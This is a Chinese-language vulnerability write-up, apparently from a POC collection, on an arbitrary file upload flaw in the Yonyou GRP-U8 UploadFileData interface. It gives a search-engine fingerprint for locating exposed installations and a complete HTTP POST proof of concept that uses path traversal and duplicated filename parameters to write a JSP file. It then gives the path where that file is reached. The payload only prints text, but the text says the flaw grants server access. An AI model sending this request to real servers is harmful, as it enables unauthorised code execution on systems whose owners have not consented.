# 用友 GRP-U8 UploadFileData 任意文件上传漏洞

## 漏洞描述

用友 GRP-U8 UploadFileData接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限

## 漏洞影响

<a-checkbox checked>用友 GRP-U8 </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="用友-GRP-U8"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1658984179476-4b141067-664e-4147-9632-c05e05f88b02.png)

验证POC

```php
POST /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9
Content-Type: multipart/form-data
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36

------WebKitFormBoundary92pUawKc
Content-Disposition: form-data; name="myFile";filename="test.jpg"

<% out.println("123");%>
------WebKitFormBoundary92pUawKc--
```

![img](../../../.vuepress/public/img/1658984367405-5725ee72-e2b0-457d-bbda-528499a8d165.png)

访问写入的文件

```php
/R9iPortal/debugg.jsp
```

![img](../../../.vuepress/public/img/1658985432892-1b051d1e-8f3b-4acb-8eb3-b73ad755c05f.png)